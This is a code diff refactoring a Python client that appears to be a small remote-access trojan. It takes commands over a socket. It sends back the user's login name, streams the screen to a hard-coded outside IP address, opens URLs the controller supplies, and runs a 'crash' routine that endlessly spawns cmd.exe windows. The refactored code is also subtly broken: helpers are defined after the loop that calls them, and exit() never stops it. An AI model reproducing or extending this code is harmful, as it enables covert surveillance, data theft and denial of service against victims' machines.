@@ -30,29 +30,46 @@ while (keepgoing == True):
         msg = sock.recv(1024)
         msg = msg.decode()
         while keepgoing == True:
-            if msg == "print":
-                print("hello print test")
-            elif msg == "exit":
-                keepgoing = False
+            if msg == "exit":
+                exit()
             elif msg == "username":
-                username = os.getlogin()
-                sock.send(username.encode())
+                username()
             elif msg == "screenshare":
-                sock.close()
-                sender = ScreenShareClient("77.250.137.62", 8080)
-                t = threading.Thread(target=sender.start_stream)
-                t.start()
-                time.sleep(10)
-                sender.stop_stream()
+                screenshare()
             elif msg == "website":
-                website = sock.recv(1024)
-                website = website.decode()
-                webbrowser.open(website, new=1)
+                website()
             elif msg == "crash":
-                while True:
-                    os.system("start /B start cmd.exe")
-                    print("started")
+                crash()
 
     except:
         traceback.print_exc()
         continue
+
+def exit():
+    keepgoing = False
+
+
+def username():
+    username = os.getlogin()
+    sock.send(username.encode())
+
+
+def screenshare():
+    sock.close()
+    sender = ScreenShareClient("77.250.137.62", 8080)
+    t = threading.Thread(target=sender.start_stream)
+    t.start()
+    time.sleep(10)
+    sender.stop_stream()
+
+
+def website():
+    website = sock.recv(1024)
+    website = website.decode()
+    webbrowser.open(website, new=1)
+
+
+def crash():
+    while True:
+        os.system("start /B start cmd.exe")
+        print("started")
